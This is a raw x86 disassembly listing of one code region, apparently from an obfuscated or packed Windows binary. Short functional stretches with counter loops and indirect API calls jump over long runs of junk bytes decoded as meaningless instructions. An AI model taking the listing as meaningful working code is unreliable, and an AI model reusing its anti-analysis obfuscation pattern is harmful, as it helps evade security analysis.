  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433623,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x4336af,0x433743
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4336bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43367b,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43361b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4336ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x433673,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0xaf90802d
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x40835f
  40838a:	fdivr  st(0),st
  40838c:	sbb    edx,esp
  40838e:	int3   
  40838f:	daa    
  408390:	clc    
  408391:	inc    esp
  408392:	mov    bl,0x68
  408394:	inc    edx
  408395:	gs cwde 
  408397:	ins    BYTE PTR es:[edi],dx
  408398:	imul   ecx,DWORD PTR [ebp-0x26e5443c],0x87585e39
  4083a2:	and    BYTE PTR [ecx+0x28],dh
  4083a5:	js     0x408343
  4083a7:	dec    eax
  4083a8:	mov    bl,0x2c
  4083aa:	jnp    0x40841e
  4083ac:	ret    0xb224
  4083af:	sub    eax,DWORD PTR [ebx+0x5bf74c26]
  4083b5:	add    edx,DWORD PTR [edi+edi*2-0x72]
  4083b9:	push   ebp
  4083ba:	xor    bh,BYTE PTR [edx]
  4083bc:	mov    BYTE PTR ds:0x8aa177f,dh
  4083c2:	out    dx,al
  4083c3:	bnd jno 0x4083dc
  4083c6:	fcomip st,st(3)
  4083c8:	mov    edi,0x645a7b62
  4083cd:	dec    edx
  4083ce:	ret    0xec68
  4083d1:	push   ecx
  4083d2:	sub    DWORD PTR [edx],0x48
  4083d5:	mov    al,0x54
  4083d7:	lods   eax,DWORD PTR ds:[esi]
  4083d8:	mov    dl,ch
  4083da:	inc    ecx
  4083db:	pop    es
  4083dc:	fstp   TBYTE PTR [ecx+0xe10ef7d]
  4083e2:	fistp  QWORD PTR [ecx-0x24a8555e]
  4083e8:	inc    edi
  4083e9:	or     cl,cl
  4083eb:	mov    bl,0x1c
  4083ed:	sub    DWORD PTR [edi],ecx
  4083ef:	push   eax
  4083f0:	shl    BYTE PTR [edi],cl
  4083f2:	cmp    DWORD PTR [ebx-0x28c8f47b],esi
  4083f8:	sbb    BYTE PTR [edi+0x7b70f47c],0xd6
  4083ff:	or     eax,0xaad30376
  408404:	add    bl,BYTE PTR ds:0x3eb1247e
  40840a:	(bad)  [ecx+0x84f62fe]
  408410:	cmp    BYTE PTR [ebx+0x32],0x9d
  408414:	sbb    eax,0xd0a50a59
  408419:	mov    ds:0x5ed4eb1d,eax
  40841e:	js     0x40842e
  408420:	xchg   ebx,eax
  408421:	shr    DWORD PTR [edx-0x14],1
  408424:	xlat   BYTE PTR ds:[ebx]
  408425:	mov    ebx,0xcd5f9a68
  40842a:	cmp    bl,BYTE PTR [ebx+0x49c9a132]
  408430:	inc    esi
  408431:	add    al,0xc9
  408433:	dec    ebx
  408434:	and    al,0x6a
  408436:	mov    bl,0x19
  408438:	sbb    BYTE PTR [edi],bl
  40843a:	loopne 0x40847b
  40843c:	dec    ebp
  40843d:	adc    ah,cl
  40843f:	(bad)  [ebx-0xb]
  408442:	mov    ah,bl
  408444:	push   ecx
  408445:	mov    WORD PTR [edi-0x53b6d511],ds
  40844b:	jnp    0x408466
  40844d:	pop    ds
  40844e:	sbb    bl,cl
  408450:	lds    eax,FWORD PTR [eax]
  408452:	(bad)  
  408453:	jmp    0x4083f8
  408455:	fist   DWORD PTR [eax+0x22]
  408458:	push   ss
  408459:	adc    BYTE PTR [edi-0x6a8878df],0x7b
  408460:	popa   
  408461:	es leave 
  408463:	adc    DWORD PTR [edx-0xb],esp
  408466:	sar    BYTE PTR [esi-0x2e69049e],1
  40846c:	xor    eax,0x71c5556d
  408471:	jg     0x408491
  408473:	mov    ebp,ebx
  408475:	mov    al,0x15
  408477:	nop
  408478:	jno    0x40842e
  40847a:	pop    esp
  40847b:	mov    dl,0xc2
  40847d:	iret   
  40847e:	(bad)
  408482:	sub    al,0x60
  408484:	push   ebp
  408485:	mov    dl,0x7a
  408487:	mov    edi,0x201d9611
  40848c:	or     al,0x22
  40848e:	sub    eax,DWORD PTR [eax-0x22]
  408491:	adc    BYTE PTR [ecx],0x81
  408494:	push   edi
  408495:	push   ebp
  408497:	cdq    
  408498:	jmp    0x9406c64c
  40849d:	mov    cl,0xf8
  40849f:	lods   al,BYTE PTR ds:[esi]
  4084a0:	mov    al,0x7e
  4084a2:	in     al,0x45
  4084a4:	pop    ebx
  4084a5:	adc    BYTE PTR [edx+0x2a8589c6],ah
  4084ab:	push   edx
  4084ac:	fs dec ebp
  4084ae:	call   0x8dbc1449
  4084b3:	mov    ebp,0x929e7005
  4084b8:	cld    
  4084b9:	rcr    BYTE PTR [edx-0x4c79aad1],cl
  4084bf:	push   ss
  4084c0:	and    eax,0x28f2f9c8
  4084c5:	loopne 0x4084d5
  4084c7:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4084c9:	jg     0x40850e
  4084cb:	lock ja 0x4084e1
  4084ce:	adc    DWORD PTR [edx-0x3d],ebx
  4084d1:	mov    dh,0xd0
  4084d3:	sub    eax,0x81f59cf3
  4084d8:	les    edi,FWORD PTR ds:0xf2c1472e
  4084de:	pop    ds
  4084df:	mul    BYTE PTR [eax]
  4084e1:	jae    0x40847f
  4084e3:	push   ecx
  4084e4:	pop    ebp
  4084e5:	loope  0x408517
  4084e7:	mov    edi,0x2f197f81
  4084ec:	outs   dx,DWORD PTR ds:[esi]
  4084ed:	inc    DWORD PTR [ecx+0x75]
  4084f0:	add    BYTE PTR [edi+eax*8+0x94e840f],dl
  4084f7:	add    BYTE PTR [eax],al
  4084f9:	neg    edx
  4084fb:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  408502:	lea    eax,[ebp-0xc]
  408505:	and    DWORD PTR ds:0x43372f,0x0
  40850f:	jmp    0x408521
  408514:	mov    edx,DWORD PTR ds:0x43372f
  40851a:	inc    edx
  40851b:	mov    DWORD PTR ds:0x43372f,edx
  408521:	cmp    DWORD PTR ds:0x43372f,0x13
  408528:	jae    0x40854b
  40852e:	cmp    DWORD PTR ds:0x43372f,0x17
  408535:	jne    0x408546
  40853b:	push   0x433767
  408540:	call   DWORD PTR ds:0x4121cc
  408546:	jmp    0x408514
  40854b:	mov    DWORD PTR [ebp-0x10],eax
  40854e:	and    eax,0x759a
  408553:	mov    eax,DWORD PTR [ebp-0x10]
  408556:	inc    edx
  408557:	mov    edx,DWORD PTR [eax]
  408559:	imul   edx,edx,0xf89ea9ee
  40855f:	mov    DWORD PTR [eax],edx
  408561:	mov    eax,DWORD PTR [ebp-0xc]
  408564:	mov    DWORD PTR ds:0x433617,0x1de7
  40856e:	cmp    eax,0x823721f2
  408573:	je     0x4088e8
  408579:	sub    edi,ebx
  40857b:	mov    eax,DWORD PTR [ebp-0x1c]
  40857e:	sbb    edi,DWORD PTR ds:0x433673
  408584:	or     DWORD PTR [eax],0x60751c9e
  40858a:	and    DWORD PTR ds:0x4336bf,0x0
  408594:	mov    ebx,DWORD PTR ds:0x4336bf
  40859a:	inc    ebx
  40859b:	mov    DWORD PTR ds:0x4336bf,ebx
  4085a1:	cmp    DWORD PTR ds:0x4336bf,0x1f
  4085a8:	jne    0x4085bf
  4085ae:	push   DWORD PTR [ebp-0x1c]
  4085b1:	push   0x4378
  4085b6:	push   DWORD PTR [ebp-0xc]
  4085b9:	call   DWORD PTR ds:0x412010
  4085bf:	cmp    DWORD PTR ds:0x4336bf,0x19
  4085c6:	jb     0x408594
  4085cc:	jmp    0x408753
  4085d1:	xor    BYTE PTR [esi+0x61516153],dh
  4085d7:	xor    BYTE PTR [edi+0x20],dh
  4085da:	outs   dx,BYTE PTR ds:[esi]
  4085db:	fucomi st,st(1)
  4085dd:	and    eax,eax
  4085df:	pop    edi
  4085e0:	jne    0x4085ce
  4085e2:	sar    BYTE PTR [esi+0x7e],cl
  4085e5:	in     al,0x7f
  4085e7:	jle    0x408667
  4085e9:	add    sp,WORD PTR [esi-0x394cdc1b]
  4085f0:	mov    edx,0x9a64fd22
  4085f5:	inc    ebx
  4085f6:	jnp    0x408609
  4085f8:	sub    eax,0x2b4d2d78
  4085fd:	daa    
  4085fe:	mov    esp,0xaea85632
  408603:	dec    ebp
  408604:	push   ds
  408605:	push   edx
  408606:	stos   BYTE PTR es:[edi],al
  408607:	or     cl,bh
  408609:	inc    esi
  40860a:	pop    eax
  40860b:	das    
  40860c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40860d:	dec    ebx
  40860e:	outs   dx,DWORD PTR ds:[esi]
  40860f:	mov    eax,0xa7079ca4
  408614:	xchg   esi,eax
  408615:	loopne 0x408692
  408617:	out    dx,al
  408618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408619:	in     al,0x2
  40861b:	add    eax,0x5b3a7ffd
  408620:	into   
  408621:	and    ah,BYTE PTR [ecx-0x46d2f61b]
  408627:	inc    eax
  408628:	xchg   esp,eax
  408629:	dec    esp
  40862a:	xor    BYTE PTR [ebx],dl
  40862c:	sub    DWORD PTR [esi-0x6b],0x42
  408630:	cmp    DWORD PTR [ecx-0x23],ebp
  408633:	fistp  DWORD PTR [ebx]
  408635:	sub    eax,0xac8f32b5
  40863a:	sahf   
  40863b:	pop    ebx
  40863c:	mov    WORD PTR [ebx-0x3],es
  40863f:	lods   al,BYTE PTR ds:[esi]
  408640:	in     al,dx
  408641:	add    cl,dh
  408643:	lock in al,0xe0
  408646:	fs (bad) 
  408648:	popf   
  408649:	xchg   DWORD PTR [edi+0xf0e8be3],ebx
  40864f:	or     eax,0x4d7c5104
  408654:	push   ss
  408655:	ret    
  408656:	ds inc ebx
  408658:	shl    DWORD PTR [esi+edi*1],0xc8
  40865c:	xchg   ebx,eax
  40865d:	dec    ecx
  40865e:	enter  0xf357,0xd5
  408662:	xchg   DWORD PTR [eax+0x680a766f],edx
  408668:	mov    dl,0xc6
  40866a:	sahf   
  40866b:	call   0x3919:0x72547b36
  408672:	mov    eax,ds:0x4e496be2
  408677:	sub    DWORD PTR [ebp+0x3e],edi
  40867a:	pop    eax
  40867b:	outs   dx,DWORD PTR ds:[esi]
  40867c:	clc    
  40867d:	retf   
  40867e:	jbe    0x408642
  408680:	mov    DWORD PTR [esi+0x3],ebp
  408683:	arpl   WORD PTR [ecx-0x2a2867a7],bx
  408689:	cmp    eax,0xd7171f0c
  40868e:	jmp    0x408631
  408690:	cdq    
  408691:	fstp   QWORD PTR [eax+0x731dd2d0]
  408697:	and    eax,0x7f0e2898
  40869c:	jo     0x408698
  40869e:	mov    al,ds:0xcbc1083c
  4086a3:	mov    cl,ah
  4086a5:	cld    
  4086a6:	cmp    al,BYTE PTR [edi+0x3c]
  4086a9:	jg     0x40864a
  4086ab:	ror    DWORD PTR [edx+0x7c88a0fc],0xed
  4086b2:	or     eax,0x3517fcb
  4086b7:	fucom  st(2)
  4086b9:	jecxz  0x4086fd
  4086bb:	sbb    ebp,esp
  4086bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086be:	or     ebx,DWORD PTR [ecx+0x23e04bbb]
  4086c4:	xchg   DWORD PTR [eax],ebx
  4086c6:	(bad)  [eax]
  4086c8:	aas    
  4086c9:	inc    esi
  4086ca:	mov    al,0x3a
  4086cc:	and    eax,ebx
  4086ce:	fst    QWORD PTR [ecx-0x76]
  4086d1:	xchg   ebp,eax
  4086d2:	aaa    
  4086d3:	sti    
  4086d4:	or     cl,bh
  4086d6:	shl    dh,1
  4086d8:	imul   edi,DWORD PTR [eax+ecx*4],0xffffff96
  4086dc:	arpl   WORD PTR ds:0xf4ddbda7,ax
  4086e2:	cmp    ebp,DWORD PTR [eax-0x669886e9]
  4086e8:	push   es
  4086e9:	cwde   
  4086ea:	ins    BYTE PTR es:[edi],dx
  4086eb:	test   BYTE PTR ds:0x481bbafc,0xd
  4086f2:	rcr    BYTE PTR [ebx+edi*8-0x59],0x40
  4086f7:	shr    DWORD PTR [edi+0x1],0xfa
  4086fb:	fcom   DWORD PTR [ebp+0x41]
  4086fe:	push   ss
  4086ff:	scas   al,BYTE PTR es:[edi]
  408700:	xor    edx,DWORD PTR [edi-0xb]
  408703:	or     al,0x22
  408705:	pop    ss
  408706:	leave  
  408707:	cmp    edi,edx
  408709:	pop    esi
  40870a:	cmp    ch,BYTE PTR [esi+0x511941c2]
  408710:	pop    edi
  408711:	fwait
  408712:	idiv   DWORD PTR [ebp-0x37ce8094]
  408718:	sub    DWORD PTR [ebx+0x19d9365e],ebx
  40871e:	int3   
  40871f:	fldcw  WORD PTR [esi-0x39]
  408722:	cli    
  408723:	add    eax,DWORD PTR [ecx-0x45bbb45e]
  408729:	sahf   
  40872a:	dec    eax
  40872b:	sbb    eax,esp
  40872d:	ds sbb ah,dl
  408730:	or     BYTE PTR [edi-0x8ba51b],ah
  408736:	cmp    edi,DWORD PTR [edi]
  408738:	adc    esi,DWORD PTR [edi]
  40873a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40873b:	and    DWORD PTR [eax],0xffffffb5
  40873e:	aas    
  40873f:	bound  edi,QWORD PTR [eax-0x5cd9e2ed]
  408745:	mov    ecx,0xe5b2381d
  40874a:	in     al,0x79
  40874c:	aas    
  40874d:	sub    esi,DWORD PTR [ebx]
  40874f:	sub    eax,0x8b554459
  408754:	inc    ebp
  408755:	clc    
  408756:	xor    eax,ecx
  408758:	add    eax,esi
  40875a:	jmp    0x4088e1
  40875f:	(bad)  
  408761:	adc    DWORD PTR [ebp+0x71684531],eax
  408767:	test   BYTE PTR [esi+0x41],cl
  40876a:	or     BYTE PTR [eax],dl
  40876c:	pop    ebp
  40876d:	gs and eax,0x7e7ed352
  408773:	in     al,0x7f
  408775:	jle    0x4087f5
  408777:	test   ecx,0xed56fbe5
  40877d:	adc    al,0x6a
  40877f:	add    BYTE PTR [ecx],al
  408781:	jmp    0xa131:0xe3374d3a
  408788:	mov    DWORD PTR [edx],0xf6886115
  40878e:	int3   
  40878f:	or     BYTE PTR [esi+0x67],0x93
  408793:	(bad)  
  408794:	dec    edi
  408795:	mov    cl,0x73
  408797:	loopne 0x4087f4
  408799:	imul   edx,edi,0x4bc9133e
  40879f:	jge    0x408761
  4087a1:	or     bh,cl
  4087a3:	sub    al,BYTE PTR [esi-0x4c5c7e84]
  4087a9:	scas   eax,DWORD PTR es:[edi]
  4087aa:	pop    ds
  4087ab:	sbb    esp,edi
  4087ad:	in     al,dx
  4087ae:	mov    al,0x21
  4087b0:	or     DWORD PTR [edx+edx*2-0xe],eax
  4087b4:	pop    edi
  4087b5:	add    al,0x4d
  4087b7:	mov    dl,0x7a
  4087b9:	pop    ebx
  4087ba:	lea    edi,[edx]
  4087bc:	(bad)  
  4087bd:	and    esp,DWORD PTR [edx+ecx*1+0x3e]
  4087c1:	or     BYTE PTR [edi+0x66b015af],cl
  4087c7:	adc    ebp,DWORD PTR [edx+esi*8-0x411dd91e]
  4087ce:	pushw  0xffdd
  4087d1:	stc    
  4087d2:	add    al,0xb3
  4087d4:	pminub mm0,mm5
  4087d7:	cld    
  4087d8:	jbe    0x4087bb
  4087da:	inc    esp
  4087db:	pop    ebx
  4087dc:	loopne 0x408775
  4087de:	lods   al,BYTE PTR ds:[esi]
  4087df:	gs xor eax,0x5d428146
  4087e5:	f2xm1  
  4087e7:	mov    bl,BYTE PTR [esp+eax*2-0x5a998900]
  4087ee:	push   esi
  4087ef:	adc    ebp,DWORD PTR [edi-0x3112a4f6]
  4087f5:	jle    0x4087d8
  4087f7:	rol    BYTE PTR [edi+edx*8-0x43f5f23],0x69
  4087ff:	mov    cl,BYTE PTR [ebx+0x5d]
  408802:	aam    0x5f
  408804:	and    eax,0xdb2418e7
  408809:	push   es
  40880a:	fimul  WORD PTR [ebp+0x42]
  40880d:	jbe    0x408834
  40880f:	push   esi
  408810:	mov    eax,DWORD PTR [edi-0x1f]
  408813:	jge    0x40886f
  408815:	dec    ecx
  408816:	test   BYTE PTR [eax-0x6f],bl
  408819:	xor    ch,BYTE PTR [eax]
  40881b:	fsubrp st(7),st
  40881d:	mov    DWORD PTR [ecx],edi
  40881f:	in     eax,0x5e
  408821:	xchg   edx,eax
  408822:	fst    QWORD PTR [edx]
  408824:	sar    BYTE PTR [edx+0x25],cl
  408827:	pop    edi
  408828:	adc    DWORD PTR [edi+0x4006cf14],0xa
  40882f:	push   es
  408830:	(bad)  
  408831:	pusha  
  408832:	test   DWORD PTR [ebp-0x1a],ebx
  408835:	xor    esp,ebx
  408837:	popf   
  408838:	mul    BYTE PTR [eax]
  40883a:	jb     0x4087ec
  40883c:	(bad)  
  40883d:	xor    al,0x35
  40883f:	loope  0x4087fe
  408841:	stos   BYTE PTR es:[edi],al
  408842:	push   eax
  408843:	(bad)  
  408844:	icebp  
  408845:	das    
  408846:	xor    DWORD PTR [ebp-0x3afd8f8c],esi
  40884c:	xor    al,bl
  40884e:	push   esp
  40884f:	popa   
  408850:	inc    esp
  408851:	mov    edi,0xe0e2a5a2
  408856:	mov    edx,0x9bf80bc9
  40885b:	xor    al,ah
  40885d:	ins    BYTE PTR es:[edi],dx
  40885e:	into   
  40885f:	sar    BYTE PTR ds:0x73ca9c64,0xe1
  408866:	cmp    ebx,ecx
  408868:	test   DWORD PTR ds:0x749f96dd,edx
  40886e:	dec    eax
  40886f:	sub    eax,0x31aa225
  408874:	addr16 jl 0x4088f3
  408877:	push   eax
  408878:	es out 0x61,eax
  40887b:	outs   dx,DWORD PTR ds:[esi]
  40887c:	push   cs
  40887d:	dec    edi
  40887e:	dec    ecx
  40887f:	push   esp
  408880:	stos   BYTE PTR es:[edi],al
  408881:	fild   DWORD PTR [edi+0x5e7e247a]
  408887:	pop    eax
  408888:	pusha  
  408889:	jge    0x40890a
  40888b:	add    eax,0x6a0de088
  408890:	pop    ecx
  408891:	pop    ebx
  408892:	js     0x40889c
  408894:	push   eax
  408895:	ds xor eax,0xdba9a30f
  40889b:	mov    ebx,edx
  40889d:	jne    0x4088f6
  40889f:	add    ebx,DWORD PTR [ebx-0x70]
  4088a2:	pop    ss
  4088a3:	test   ebp,ebx
  4088a5:	cmp    eax,0x9a6d9050
  4088aa:	ins    DWORD PTR es:[edi],dx
  4088ab:	adc    eax,0x94e1e0d8
  4088b0:	sar    BYTE PTR gs:[ebp+ecx*8-0x2e080d07],cl
  4088b8:	mov    edi,0x50db651c
  4088bd:	and    DWORD PTR [ecx+ecx*4-0x24adf25a],edi
  4088c4:	test   eax,0xd03298a1
  4088c9:	outs   dx,BYTE PTR ds:[esi]
  4088ca:	test   BYTE PTR [ecx-0x5f],cl
  4088cd:	jmp    0x50fa35b9
  4088d2:	or     al,BYTE PTR [ecx]
  4088d4:	stos   DWORD PTR es:[edi],eax
  4088d5:	std    
  4088d6:	mov    dl,BYTE PTR [ecx-0x5bcee696]
  4088dc:	jae    0x40891b
  4088de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088df:	xchg   esp,eax
  4088e0:	popa   
  4088e1:	pop    edi
  4088e2:	pop    esi
  4088e3:	pop    ebx
  4088e4:	leave  
  4088e5:	ret    0x4
  4088e8:	mov    eax,DWORD PTR [ebp-0xc]
  4088eb:	add    eax,DWORD PTR [ebp-0x18]
  4088ee:	cmp    eax,0x7ad64f9b
  4088f3:	je     0x408907
  4088f9:	mov    eax,DWORD PTR [ebp-0x10]
  4088fc:	and    DWORD PTR [eax],0x751c99
  408902:	jmp    0x40858a
  408907:	mov    eax,DWORD PTR [ebp-0xc]
  40890a:	mov    edx,DWORD PTR [ebp-0x18]
  40890d:	or     eax,edx
  40890f:	cmp    eax,0xfabf2dfb
  408914:	je     0x408928
  40891a:	mov    eax,DWORD PTR [ebp-0x10]
  40891d:	xor    DWORD PTR [eax],0x2650fa8f
  408923:	jmp    0x40858a
  408928:	mov    ax,WORD PTR [ebp-0x4]
  40892c:	jmp    0x408ab3
  408931:	test   eax,0x53c2d3f0
  408936:	loope  0x4088e1
  408938:	jno    0x40892b
  40893a:	jmp    0x6b8d681a
  40893f:	mov    bl,0xeb
  408941:	cmp    cl,dl
  408943:	jle    0x4089c3
  408945:	in     al,0x7f
  408947:	jle    0x4089c7
  408949:	out    dx,al
  40894a:	lods   eax,DWORD PTR fs:[esi]
  40894c:	xchg   esi,eax
  40894d:	pop    es
  40894e:	dec    esi
  40894f:	xchg   ebp,edx
  408951:	push   edx
  408952:	enter  0xfa49,0x41
  408956:	mov    esi,0x2df9c789
  40895b:	dec    eax
  40895c:	sbb    bl,ch
  40895e:	retf   
  40895f:	adc    eax,0xe5f139b7
  408964:	mov    eax,ds:0x21582b20
  408969:	clc    
  40896a:	(bad)  
  40896b:	jmp    0x40892e
  40896d:	sub    esi,DWORD PTR [eax]
  40896f:	sub    al,0xbd
  408971:	(bad)  
  408972:	xchg   edx,eax
  408973:	jno    0x408984
  408975:	mov    al,0x76
  408977:	(bad)  
  408978:	jl     0x4089b4
  40897a:	mov    bl,0x8c
  40897c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40897d:	dec    esp
  40897e:	jmp    0x40891f
  408980:	push   ecx
  408981:	sbb    DWORD PTR [ebp-0x77],0xffffffd5
  408985:	je     0x4089c6
  408987:	fcmovnu st,st(5)
  408989:	loop   0x40899f
  40898b:	dec    edi
  40898c:	sar    DWORD PTR [eax-0x2cf9aed8],0x7f
  408993:	cmp    eax,0x579b1729
  408998:	cdq    
  408999:	cmc    
  40899a:	add    WORD PTR [ebp+eax*2+0x3f],0x8
  4089a0:	mov    ch,bl
  4089a2:	into   
  4089a3:	iret   
  4089a4:	inc    ebx
  4089a5:	out    dx,al
  4089a6:	mov    eax,0x4c5ea34e
  4089ab:	rol    BYTE PTR [edi],cl
  4089ad:	stc    
  4089ae:	mov    dl,0xc5
  4089b0:	fisub  DWORD PTR [eax+0x76f4e7b9]
  4089b6:	sub    al,0xf8
  4089b8:	or     eax,0xeec8c23d
  4089bd:	leave  
  4089be:	dec    ebp
  4089bf:	and    al,BYTE PTR [edi]
  4089c1:	out    0x35,al
  4089c3:	fidivr WORD PTR [ebp+eax*8-0x25aa7787]
  4089ca:	xor    ebp,edi
  4089cc:	ins    DWORD PTR es:[edi],dx
  4089cd:	(bad)  
  4089ce:	scas   al,BYTE PTR es:[edi]
  4089cf:	bound  edx,QWORD PTR [eax]
  4089d1:	dec    edi
  4089d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089d3:	cmp    eax,0x59f7504d
  4089d8:	xor    eax,0xf85bf1a4
  4089dd:	pop    esp
  4089de:	into   
  4089df:	or     bl,cl
  4089e1:	daa    
  4089e2:	mov    esi,0x6686c801
  4089e7:	mov    ah,0x1
  4089e9:	xor    al,0x5c
  4089eb:	mov    ebx,0xd7753b5f
  4089f0:	gs mov ah,0xe6
  4089f3:	push   cs
  4089f4:	fnstsw WORD PTR [edi]
  4089f6:	arpl   sp,si
  4089f8:	mov    ds:0xc6c0c1e5,al
  4089fd:	sbb    BYTE PTR [edi-0x37c2bdf9],ah
  408a03:	xor    ah,al
  408a05:	push   esi
  408a06:	adc    al,0x43
  408a08:	pop    ebp
  408a09:	sbb    DWORD PTR [ebp-0x72],0xdde7b931
  408a10:	xchg   edi,eax
  408a11:	and    al,0x87
  408a13:	xchg   esi,eax
  408a14:	(bad)  
  408a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a16:	repz xor eax,0xe3f5102
  408a1c:	pop    ebp
  408a1d:	xchg   bh,bh
  408a1f:	mov    DWORD PTR [eax-0x3c],ecx
  408a22:	jae    0x408a34
  408a24:	sbb    al,0x5d
  408a26:	ss addr16 fs mov ebp,0x5b5650b6
  408a2e:	stc    
  408a2f:	sbb    dh,0xc9
  408a32:	sub    bl,dl
  408a34:	leave  
  408a35:	test   al,0xfd
  408a37:	xor    BYTE PTR [eax+0x33],ch
  408a3a:	mov    dl,0xac
  408a3c:	and    bh,BYTE PTR [eax+0x589fb50]
  408a42:	push   0x49
  408a44:	cmc    
  408a45:	mul    esi
  408a47:	aas    
  408a48:	out    dx,al
  408a49:	pop    edx
  408a4a:	je     0x408a97
  408a4c:	xchg   esp,eax
  408a4d:	xchg   esi,eax
  408a4e:	imul   edx,eax,0xbae2e4c4
  408a54:	sub    eax,0x4f06732b
  408a59:	xchg   ebp,eax
  408a5a:	add    eax,0x8cb29623
  408a5f:	push   es
  408a60:	mov    WORD PTR [ecx-0x6261269b],?
  408a66:	adc    al,bh
  408a68:	int3   
  408a69:	pop    es
  408a6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a6b:	lods   eax,DWORD PTR ds:[esi]
  408a6c:	xchg   esi,eax
  408a6d:	add    cl,0x9
  408a70:	out    dx,eax
  408a71:	push   ebx
  408a72:	sbb    al,0xb2
  408a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a75:	add    eax,0x5bf2ce24
  408a7a:	(bad)
  408a7f:	shl    DWORD PTR [ecx+0x76],1
  408a82:	jae    0x408a7d
  408a84:	stos   DWORD PTR es:[edi],eax
  408a85:	and    BYTE PTR [ebx+0x4a7d7258],0xfb
  408a8c:	add    edx,esp
  408a8e:	es push eax
  408a90:	cld    
  408a91:	cmp    edi,DWORD PTR [edx]
  408a93:	or     al,0x70
  408a95:	stos   DWORD PTR es:[edi],eax
  408a96:	(bad)  
  408a97:	mov    ecx,0x91370c68
  408a9c:	and    ecx,ebp
  408a9e:	jno    0x408a47
  408aa0:	jmp    0xcc413bb
  408aa5:	(bad)  
  408aa6:	dec    esp
  408aa7:	inc    ecx
  408aa8:	sti    
  408aa9:	das    
  408aaa:	pop    edi
  408aab:	scas   al,BYTE PTR es:[edi]
  408aac:	jp     0x408a67
  408aae:	push   ebx
  408aaf:	inc    eax
  408ab0:	push   esp
  408ab1:	pop    ecx
  408ab2:	cmp    DWORD PTR [ebx+0x3f8b087d],ecx
  408ab8:	mov    edx,0x8a3c
  408abd:	xor    ax,dx
  408ac0:	mov    edx,0x3b02
  408ac5:	add    ax,dx
  408ac8:	cmp    ax,WORD PTR [edi]
  408acb:	je     0x408c9f
  408ad1:	mov    eax,DWORD PTR [ebp-0x14]
  408ad4:	xor    eax,ecx
  408ad6:	add    eax,esi
  408ad8:	mov    DWORD PTR [ebp-0x24],eax
  408adb:	mov    eax,DWORD PTR [ebp-0x28]
  408ade:	mov    di,WORD PTR [ebp-0x2c]
  408ae2:	mov    ebx,0x8a3c
  408ae7:	xor    di,bx
  408aea:	add    di,dx
  408aed:	movzx  edx,di
  408af0:	mov    edi,DWORD PTR [ebp-0x8]
  408af3:	xor    edi,ecx
  408af5:	lea    edx,[edx+edi*1+0x32729b]
  408afc:	add    DWORD PTR [eax],edx
  408afe:	mov    eax,DWORD PTR [ebp-0x20]
  408b01:	mov    edx,DWORD PTR [ebp-0x8]
  408b04:	mov    edi,DWORD PTR [ebp-0x24]
  408b07:	xor    edx,ecx
  408b09:	jmp    0x408c90
  408b0e:	push   esi
  408b0f:	adc    BYTE PTR [ebx+0x50555155],0x81
  408b16:	sub    esi,edi
  408b18:	jmp    0x408b0d
  408b1a:	fild   DWORD PTR [ebp-0x1e]
  408b1d:	data16 scas al,BYTE PTR es:[edi]
  408b1f:	fidivr WORD PTR [esi+0x7e]
  408b22:	in     al,0x7f
  408b24:	jle    0x408ba4
  408b26:	in     eax,0xcd
  408b28:	ret    
  408b29:	add    eax,0x42dd2bae
  408b2e:	jo     0x408afc
  408b30:	outs   dx,BYTE PTR ds:[esi]
  408b31:	cmp    DWORD PTR [ebx-0x67],esi
  408b34:	out    0xfd,eax
  408b36:	adc    ecx,DWORD PTR [ebp+0x508548c1]
  408b3c:	jb     0x408aed
  408b3e:	fnstenv ds:0xb6c3e5ca
  408b44:	addr16 xchg esi,eax
  408b46:	and    dh,BYTE PTR [ebx]
  408b48:	out    dx,al
  408b49:	leave  
  408b4a:	adc    edi,DWORD PTR [eax+ebx*4+0x63d65b3d]
  408b51:	stos   DWORD PTR es:[edi],eax
  408b52:	fisubr WORD PTR [ecx+0xd]
  408b55:	pushf  
  408b56:	sub    bl,BYTE PTR [esi-0x2029dee3]
  408b5c:	test   BYTE PTR ds:0xb64ced7f,dl
  408b62:	mov    al,0x9e
  408b64:	cmp    al,BYTE PTR [ecx+0x7fbb83d7]
  408b6a:	adc    cl,BYTE PTR [edx-0x77]
  408b6d:	mov    WORD PTR fs:[ebx-0x76],gs
  408b71:	ja     0x408b0f
  408b73:	add    BYTE PTR [ecx],al
  408b75:	jns    0x408bde
  408b77:	push   eax
  408b78:	je     0x408b3d
  408b7a:	retf   0x2745
  408b7d:	sub    al,0x73
  408b7f:	push   edx
  408b80:	jnp    0x408b4f
  408b82:	jbe    0x408b0a
  408b84:	xor    DWORD PTR [ecx-0x67fb51d1],edi
  408b8a:	pop    ds
  408b8b:	(bad)  
  408b8d:	and    eax,0xb4aa87c6
  408b92:	sub    BYTE PTR [edx-0x5aefcc87],ch
  408b98:	mov    WORD PTR [eax],es
  408b9a:	mov    dl,0x6e
  408b9c:	push   eax
